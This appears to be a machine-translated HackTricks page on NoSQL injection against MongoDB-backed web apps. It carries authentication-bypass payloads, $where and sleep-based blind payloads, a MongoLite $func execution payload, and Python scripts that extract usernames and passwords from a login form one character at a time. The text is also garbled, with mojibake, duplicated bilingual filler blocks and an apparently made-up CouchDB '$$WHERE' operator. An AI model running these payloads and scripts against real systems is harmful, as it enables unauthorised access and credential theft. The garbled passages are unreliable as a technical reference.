# NoSQLæ³¨å…¥

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

NoSQLæ•°æ®åº“æä¾›æ¯”ä¼ ç»ŸSQLæ•°æ®åº“æ›´å®½æ¾çš„ä¸€è‡´æ€§é™åˆ¶ã€‚é€šè¿‡å‡å°‘å…³ç³»çº¦æŸå’Œä¸€è‡´æ€§æ£€æŸ¥ï¼ŒNoSQLæ•°æ®åº“é€šå¸¸æä¾›æ€§èƒ½å’Œæ‰©å±•æ€§çš„ä¼˜åŠ¿ã€‚ç„¶è€Œï¼Œå³ä½¿å®ƒä»¬ä¸ä½¿ç”¨ä¼ ç»Ÿçš„SQLè¯­æ³•ï¼Œè¿™äº›æ•°æ®åº“ä»ç„¶å¯èƒ½å—åˆ°æ³¨å…¥æ”»å‡»çš„å½±å“ã€‚

## æ”»å‡»

åœ¨PHPä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡å°†å‘é€çš„å‚æ•°ä»_parameter=foo_æ›´æ”¹ä¸º_parameter\[arrName]=foo_æ¥å‘é€ä¸€ä¸ªæ•°ç»„ã€‚

è¿™äº›æ”»å‡»æ˜¯åŸºäºæ·»åŠ ä¸€ä¸ª**è¿ç®—ç¬¦**ï¼š
```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```
### åŸºæœ¬èº«ä»½éªŒè¯ç»•è¿‡

**ä½¿ç”¨ä¸ç­‰äº ($ne) æˆ–å¤§äº ($gt)**
```bash
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```
### **SQL - Mongo**

### **SQLæ³¨å…¥æ”»å‡» - Mongo**

NoSQL databases, such as MongoDB, use a different query language than traditional SQL databases. However, they are still vulnerable to injection attacks. In the case of MongoDB, the attack is called NoSQL injection.

éå…³ç³»å‹æ•°æ®åº“ï¼ˆå¦‚MongoDBï¼‰ä½¿ç”¨ä¸ä¼ ç»ŸSQLæ•°æ®åº“ä¸åŒçš„æŸ¥è¯¢è¯­è¨€ã€‚ç„¶è€Œï¼Œå®ƒä»¬ä»ç„¶å®¹æ˜“å—åˆ°æ³¨å…¥æ”»å‡»çš„å½±å“ã€‚åœ¨MongoDBä¸­ï¼Œè¿™ç§æ”»å‡»è¢«ç§°ä¸ºNoSQLæ³¨å…¥ã€‚

NoSQL injection occurs when untrusted user input is directly concatenated into a query, allowing an attacker to manipulate the query's logic. This can lead to unauthorized access, data leakage, or even remote code execution.

å½“ä¸å—ä¿¡ä»»çš„ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°æŸ¥è¯¢ä¸­æ—¶ï¼Œå°±ä¼šå‘ç”ŸNoSQLæ³¨å…¥ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ“çºµæŸ¥è¯¢çš„é€»è¾‘ã€‚è¿™å¯èƒ½å¯¼è‡´æœªç»æˆæƒçš„è®¿é—®ã€æ•°æ®æ³„éœ²ï¼Œç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

To prevent NoSQL injection, it is important to properly sanitize and validate user input before using it in a query. This can be done by using parameterized queries or prepared statements, which ensure that user input is treated as data and not as executable code.

ä¸ºäº†é˜²æ­¢NoSQLæ³¨å…¥ï¼Œé‡è¦çš„æ˜¯åœ¨ä½¿ç”¨ç”¨æˆ·è¾“å…¥ä¹‹å‰æ­£ç¡®åœ°å¯¹å…¶è¿›è¡Œæ¸…ç†å’ŒéªŒè¯ã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æˆ–é¢„ç¼–è¯‘è¯­å¥æ¥å®ç°è¿™ä¸€ç‚¹ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿ç”¨æˆ·è¾“å…¥è¢«è§†ä¸ºæ•°æ®è€Œä¸æ˜¯å¯æ‰§è¡Œä»£ç ã€‚

Additionally, it is recommended to follow the principle of least privilege when configuring database access. Limiting the privileges of database users can help mitigate the impact of a successful injection attack.

æ­¤å¤–ï¼Œåœ¨é…ç½®æ•°æ®åº“è®¿é—®æ—¶ï¼Œå»ºè®®éµå¾ªæœ€å°æƒé™åŸåˆ™ã€‚é™åˆ¶æ•°æ®åº“ç”¨æˆ·çš„æƒé™å¯ä»¥å¸®åŠ©å‡è½»æˆåŠŸæ³¨å…¥æ”»å‡»çš„å½±å“ã€‚

In conclusion, even though NoSQL databases use a different query language, they are still susceptible to injection attacks. By properly sanitizing user input and following the principle of least privilege, the risk of NoSQL injection can be significantly reduced.

æ€»ä¹‹ï¼Œå°½ç®¡éå…³ç³»å‹æ•°æ®åº“ä½¿ç”¨ä¸åŒçš„æŸ¥è¯¢è¯­è¨€ï¼Œä½†å®ƒä»¬ä»ç„¶å®¹æ˜“å—åˆ°æ³¨å…¥æ”»å‡»çš„å½±å“ã€‚é€šè¿‡æ­£ç¡®æ¸…ç†ç”¨æˆ·è¾“å…¥å¹¶éµå¾ªæœ€å°æƒé™åŸåˆ™ï¼Œå¯ä»¥æ˜¾è‘—é™ä½NoSQLæ³¨å…¥çš„é£é™©ã€‚
```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00
```
### æå–**é•¿åº¦**ä¿¡æ¯

In NoSQL injection attacks, it is often useful to extract information about the length of a particular field or parameter. This can help in understanding the structure of the database and crafting further attacks.

åœ¨NoSQLæ³¨å…¥æ”»å‡»ä¸­ï¼Œæå–ç‰¹å®šå­—æ®µæˆ–å‚æ•°çš„é•¿åº¦ä¿¡æ¯é€šå¸¸å¾ˆæœ‰ç”¨ã€‚è¿™æœ‰åŠ©äºç†è§£æ•°æ®åº“çš„ç»“æ„å¹¶æ„é€ è¿›ä¸€æ­¥çš„æ”»å‡»ã€‚

To extract the length of a field, you can use the `$where` operator in MongoDB or the `$$WHERE` operator in CouchDB. These operators allow you to execute JavaScript code on the server-side.

è¦æå–å­—æ®µçš„é•¿åº¦ï¼Œå¯ä»¥åœ¨MongoDBä¸­ä½¿ç”¨`$where`è¿ç®—ç¬¦æˆ–åœ¨CouchDBä¸­ä½¿ç”¨`$$WHERE`è¿ç®—ç¬¦ã€‚è¿™äº›è¿ç®—ç¬¦å…è®¸åœ¨æœåŠ¡å™¨ç«¯æ‰§è¡ŒJavaScriptä»£ç ã€‚

Here is an example of extracting the length of a field in MongoDB:

ä»¥ä¸‹æ˜¯åœ¨MongoDBä¸­æå–å­—æ®µé•¿åº¦çš„ç¤ºä¾‹ï¼š

```javascript
db.collection.find({ $where: "this.field.length == 10" })
```

And here is an example for CouchDB:

ä»¥ä¸‹æ˜¯CouchDBçš„ç¤ºä¾‹ï¼š

```javascript
db.view('design_doc/view_name', { keys: ["param"], $$WHERE: "param.length == 10" })
```

By manipulating the length condition, you can extract different information from the database.

é€šè¿‡æ“ä½œé•¿åº¦æ¡ä»¶ï¼Œå¯ä»¥ä»æ•°æ®åº“ä¸­æå–ä¸åŒçš„ä¿¡æ¯ã€‚

### Extract **substring** information

### æå–**å­å­—ç¬¦ä¸²**ä¿¡æ¯

In addition to extracting the length of a field, you can also extract specific substrings from the field's value. This can be useful when trying to extract sensitive information such as passwords or API keys.

é™¤äº†æå–å­—æ®µçš„é•¿åº¦å¤–ï¼Œè¿˜å¯ä»¥ä»å­—æ®µçš„å€¼ä¸­æå–ç‰¹å®šçš„å­å­—ç¬¦ä¸²ã€‚å½“å°è¯•æå–æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å¯†ç æˆ–APIå¯†é’¥ï¼‰æ—¶ï¼Œè¿™å¯èƒ½å¾ˆæœ‰ç”¨ã€‚

To extract a substring, you can use the same `$where` or `$$WHERE` operators mentioned earlier. Here is an example of extracting a substring in MongoDB:

è¦æå–å­å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨å‰é¢æåˆ°çš„`$where`æˆ–`$$WHERE`è¿ç®—ç¬¦ã€‚ä»¥ä¸‹æ˜¯åœ¨MongoDBä¸­æå–å­å­—ç¬¦ä¸²çš„ç¤ºä¾‹ï¼š

```javascript
db.collection.find({ $where: "this.field.substring(0, 5) == 'abcde'" })
```

And here is an example for CouchDB:

ä»¥ä¸‹æ˜¯CouchDBçš„ç¤ºä¾‹ï¼š

```javascript
db.view('design_doc/view_name', { keys: ["param"], $$WHERE: "param.substring(0, 5) == 'abcde'" })
```

By changing the substring condition, you can extract different parts of the field's value.

é€šè¿‡æ›´æ”¹å­å­—ç¬¦ä¸²æ¡ä»¶ï¼Œå¯ä»¥æå–å­—æ®µå€¼çš„ä¸åŒéƒ¨åˆ†ã€‚
```bash
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# True if the length equals 1,3...
```
### æå–**æ•°æ®**ä¿¡æ¯

NoSQL databases, such as MongoDB, use a different query language than traditional SQL databases. This means that traditional SQL injection techniques may not work against NoSQL databases. However, NoSQL databases are still vulnerable to a type of injection attack known as NoSQL injection.

NoSQL injection occurs when untrusted user input is directly concatenated into a NoSQL query without proper sanitization or validation. This can allow an attacker to manipulate the query and extract sensitive data from the database.

To extract data from a NoSQL database using injection, you can use techniques similar to those used in SQL injection attacks. The goal is to manipulate the query in a way that allows you to bypass authentication, retrieve data from other users, or extract sensitive information.

Here are some common techniques used in NoSQL injection attacks:

1. **Boolean-based technique**: This technique involves injecting a condition that always evaluates to true, allowing you to retrieve data that would not normally be accessible.

2. **Time-based technique**: This technique involves injecting a delay into the query, allowing you to infer information based on the response time of the query.

3. **Error-based technique**: This technique involves injecting a query that intentionally causes an error, revealing information about the structure or content of the database.

4. **Blind technique**: This technique involves injecting a query that does not produce a visible response, but allows you to infer information based on the behavior of the application.

To protect against NoSQL injection attacks, it is important to properly sanitize and validate user input before using it in a query. This can include techniques such as parameterized queries, input validation, and output encoding.

By understanding and applying these techniques, you can effectively extract data from NoSQL databases using injection attacks. However, it is important to note that performing such attacks without proper authorization is illegal and unethical. Always ensure that you have the necessary permissions and legal authorization before conducting any penetration testing activities.
```
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
### **SQL - Mongo**

### **SQLæ³¨å…¥æ”»å‡» - Mongo**

NoSQL databases, such as MongoDB, use a different query language than traditional SQL databases. However, they are still vulnerable to injection attacks. In the case of MongoDB, the attack is called NoSQL injection.

éå…³ç³»å‹æ•°æ®åº“ï¼ˆå¦‚MongoDBï¼‰ä½¿ç”¨ä¸ä¼ ç»ŸSQLæ•°æ®åº“ä¸åŒçš„æŸ¥è¯¢è¯­è¨€ã€‚ç„¶è€Œï¼Œå®ƒä»¬ä»ç„¶å®¹æ˜“å—åˆ°æ³¨å…¥æ”»å‡»çš„å½±å“ã€‚åœ¨MongoDBä¸­ï¼Œè¿™ç§æ”»å‡»è¢«ç§°ä¸ºNoSQLæ³¨å…¥ã€‚

NoSQL injection occurs when untrusted user input is directly concatenated into a query, allowing an attacker to manipulate the query's logic. This can lead to unauthorized access, data leakage, or even remote code execution.

å½“ä¸å—ä¿¡ä»»çš„ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°æŸ¥è¯¢ä¸­æ—¶ï¼Œå°±ä¼šå‘ç”ŸNoSQLæ³¨å…¥ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ“çºµæŸ¥è¯¢çš„é€»è¾‘ã€‚è¿™å¯èƒ½å¯¼è‡´æœªç»æˆæƒçš„è®¿é—®ã€æ•°æ®æ³„éœ²ï¼Œç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

To prevent NoSQL injection, it is important to properly sanitize and validate user input before using it in a query. This can be done by using parameterized queries or prepared statements, which ensure that user input is treated as data and not as executable code.

ä¸ºäº†é˜²æ­¢NoSQLæ³¨å…¥ï¼Œé‡è¦çš„æ˜¯åœ¨ä½¿ç”¨ç”¨æˆ·è¾“å…¥ä¹‹å‰æ­£ç¡®åœ°å¯¹å…¶è¿›è¡Œæ¸…ç†å’ŒéªŒè¯ã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æˆ–é¢„ç¼–è¯‘è¯­å¥æ¥å®ç°è¿™ä¸€ç‚¹ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿ç”¨æˆ·è¾“å…¥è¢«è§†ä¸ºæ•°æ®è€Œä¸æ˜¯å¯æ‰§è¡Œä»£ç ã€‚

Additionally, it is recommended to follow the principle of least privilege when configuring database access. Limiting the privileges of database users can help mitigate the impact of a successful injection attack.

æ­¤å¤–ï¼Œåœ¨é…ç½®æ•°æ®åº“è®¿é—®æ—¶ï¼Œå»ºè®®éµå¾ªæœ€å°æƒé™åŸåˆ™ã€‚é™åˆ¶æ•°æ®åº“ç”¨æˆ·çš„æƒé™å¯ä»¥å¸®åŠ©å‡è½»æˆåŠŸæ³¨å…¥æ”»å‡»çš„å½±å“ã€‚

In conclusion, even though NoSQL databases use a different query language, they are still susceptible to injection attacks. By properly sanitizing user input and following the principle of least privilege, the risk of NoSQL injection can be significantly reduced.

æ€»ä¹‹ï¼Œå°½ç®¡éå…³ç³»å‹æ•°æ®åº“ä½¿ç”¨ä¸åŒçš„æŸ¥è¯¢è¯­è¨€ï¼Œä½†å®ƒä»¬ä»ç„¶å®¹æ˜“å—åˆ°æ³¨å…¥æ”»å‡»çš„å½±å“ã€‚é€šè¿‡æ­£ç¡®æ¸…ç†ç”¨æˆ·è¾“å…¥å¹¶éµå¾ªæœ€å°æƒé™åŸåˆ™ï¼Œå¯ä»¥æ˜¾è‘—é™ä½NoSQLæ³¨å…¥çš„é£é™©ã€‚
```
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
```
### PHPä»»æ„å‡½æ•°æ‰§è¡Œ

ä½¿ç”¨[MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite)åº“çš„**$func**è¿ç®—ç¬¦ï¼ˆé»˜è®¤ä½¿ç”¨ï¼‰å¯èƒ½ä¼šå¯¼è‡´æ‰§è¡Œä»»æ„å‡½æ•°ï¼Œå°±åƒ[è¿™ä¸ªæŠ¥å‘Š](https://swarm.ptsecurity.com/rce-cockpit-cms/)ä¸­æ‰€è¿°ã€‚
```python
"user":{"$func": "var_dump"}
```
![](<../.gitbook/assets/image (468).png>)

### ä»ä¸åŒçš„é›†åˆä¸­è·å–ä¿¡æ¯

å¯ä»¥ä½¿ç”¨[$lookup](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/)ä»ä¸åŒçš„é›†åˆä¸­è·å–ä¿¡æ¯ã€‚åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä»ä¸€ä¸ªåä¸º`users`çš„**ä¸åŒé›†åˆ**ä¸­è¯»å–æ•°æ®ï¼Œå¹¶è·å–æ‰€æœ‰å¯†ç ä¸é€šé…ç¬¦åŒ¹é…çš„æ¡ç›®çš„ç»“æœã€‚
```json
[
{
"$lookup":{
"from": "users",
"as":"resultado","pipeline": [
{
"$match":{
"password":{
"$regex":"^.*"
}
}
}
]
}
}
]
```
<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ç›²æ³¨ NoSQL
```python
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
print("[i] Looking for char number "+str(i+1))
for char in alphabet:
r = requests.get("http://chall.com?param=^"+flag+char)
if ("<TRUE>" in r.text):
flag += char
print("[+] Flag: "+flag)
break
```

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""

while True:
for c in string.printable:
if c not in ['*','+','.','?','|']:
payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
r = requests.post(u, data = {'ids': payload}, verify = False)
if 'OK' in r.text:
print("Found one more char : %s" % (password+c))
password += c
```
## MongoDBæ”»å‡»è½½è·

### NoSQL Injection

### NoSQLæ³¨å…¥

NoSQL injection is a type of attack that targets NoSQL databases, such as MongoDB. It occurs when an attacker is able to manipulate a query in order to retrieve or modify data that they should not have access to.

NoSQLæ³¨å…¥æ˜¯ä¸€ç§é’ˆå¯¹NoSQLæ•°æ®åº“ï¼ˆå¦‚MongoDBï¼‰çš„æ”»å‡»ç±»å‹ã€‚å½“æ”»å‡»è€…èƒ½å¤Ÿæ“çºµæŸ¥è¯¢ä»¥æ£€ç´¢æˆ–ä¿®æ”¹ä»–ä»¬ä¸åº”è¯¥è®¿é—®çš„æ•°æ®æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚

In MongoDB, the query language is based on JSON-like syntax. This means that the attacker can exploit the lack of input validation and inject malicious payloads into the query.

åœ¨MongoDBä¸­ï¼ŒæŸ¥è¯¢è¯­è¨€åŸºäºç±»ä¼¼JSONçš„è¯­æ³•ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¾“å…¥éªŒè¯çš„ç¼ºå¤±ï¼Œå¹¶å°†æ¶æ„è½½è·æ³¨å…¥åˆ°æŸ¥è¯¢ä¸­ã€‚

### Basic NoSQL Injection Payloads

### åŸºæœ¬çš„NoSQLæ³¨å…¥è½½è·

Here are some basic payloads that can be used to perform NoSQL injection attacks in MongoDB:

ä»¥ä¸‹æ˜¯ä¸€äº›åŸºæœ¬çš„è½½è·ï¼Œå¯ç”¨äºåœ¨MongoDBä¸­æ‰§è¡ŒNoSQLæ³¨å…¥æ”»å‡»ï¼š

#### 1. Simple Payload

#### 1. ç®€å•è½½è·

```javascript
{"$ne": null}
```

#### 2. Logical Operators

#### 2. é€»è¾‘è¿ç®—ç¬¦

```javascript
{"$gt": ""}
{"$gte": ""}
{"$lt": ""}
{"$lte": ""}
```

#### 3. Regular Expression

#### 3. æ­£åˆ™è¡¨è¾¾å¼

```javascript
{"$regex": ""}
```

#### 4. Boolean-based Injection

#### 4. åŸºäºå¸ƒå°”çš„æ³¨å…¥

```javascript
{"$where": "this.username.match(/.*/)//"}
```

#### 5. Time-based Injection

#### 5. åŸºäºæ—¶é—´çš„æ³¨å…¥

```javascript
{"$where": "sleep(1000)"}
```

These payloads can be used to manipulate the query and retrieve sensitive information or perform unauthorized modifications.

è¿™äº›è½½è·å¯ç”¨äºæ“çºµæŸ¥è¯¢å¹¶æ£€ç´¢æ•æ„Ÿä¿¡æ¯æˆ–æ‰§è¡Œæœªç»æˆæƒçš„ä¿®æ”¹ã€‚

### Advanced NoSQL Injection Payloads

### é«˜çº§NoSQLæ³¨å…¥è½½è·

In addition to the basic payloads, there are also advanced payloads that can be used to perform more complex NoSQL injection attacks:

é™¤äº†åŸºæœ¬çš„è½½è·å¤–ï¼Œè¿˜æœ‰ä¸€äº›é«˜çº§è½½è·å¯ç”¨äºæ‰§è¡Œæ›´å¤æ‚çš„NoSQLæ³¨å…¥æ”»å‡»ï¼š

#### 1. Blind Injection

#### 1. ç›²æ³¨å…¥

```javascript
{"$where": "this.password.match(/^.{1}$/)//"}
```

#### 2. Time-based Blind Injection

#### 2. åŸºäºæ—¶é—´çš„ç›²æ³¨å…¥

```javascript
{"$where": "this.password.match(/^.{1}$/) && sleep(1000)"}
```

#### 3. Out-of-Band Injection

#### 3. åŸºäºå¸¦å¤–é€šä¿¡çš„æ³¨å…¥

```javascript
{"$where": "db.coll.insert({data: this.password})"}
```

These advanced payloads can be used to exploit more complex vulnerabilities and gain unauthorized access to the database.

è¿™äº›é«˜çº§è½½è·å¯ç”¨äºåˆ©ç”¨æ›´å¤æ‚çš„æ¼æ´å¹¶æœªç»æˆæƒåœ°è®¿é—®æ•°æ®åº“ã€‚
```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
```
## å·¥å…·

* [https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)
* [https://github.com/C4l1b4n/NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite)

### ä»POSTç™»å½•ä¸­æš´åŠ›ç ´è§£ç”¨æˆ·åå’Œå¯†ç 

è¿™æ˜¯ä¸€ä¸ªç®€å•çš„è„šæœ¬ï¼Œä½ å¯ä»¥ä¿®æ”¹å®ƒï¼Œä½†ä¹‹å‰çš„å·¥å…·ä¹Ÿå¯ä»¥å®Œæˆè¿™ä¸ªä»»åŠ¡ã€‚
```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
print("Extracting password of "+username)
params = {"username":username, "password[$regex]":"", "login": "login"}
password = "^"
while True:
for c in possible_chars:
params["password[$regex]"] = password + c + ".*"
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
if int(pr.status_code) == 302:
password += c
break
if c == possible_chars[-1]:
print("Found password "+password[1:].replace("\\", "")+" for username "+username)
return password[1:].replace("\\", "")

def get_usernames():
usernames = []
params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
for c in possible_chars:
username = "^" + c
params["username[$regex]"] = username + ".*"
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
if int(pr.status_code) == 302:
print("Found username starting with "+c)
while True:
for c2 in possible_chars:
params["username[$regex]"] = username + c2 + ".*"
if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
username += c2
print(username)
break

if c2 == possible_chars[-1]:
print("Found username: "+username[1:])
usernames.append(username[1:])
break
return usernames


for u in get_usernames():
get_password(u)
```
## å‚è€ƒèµ„æ–™

* [https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
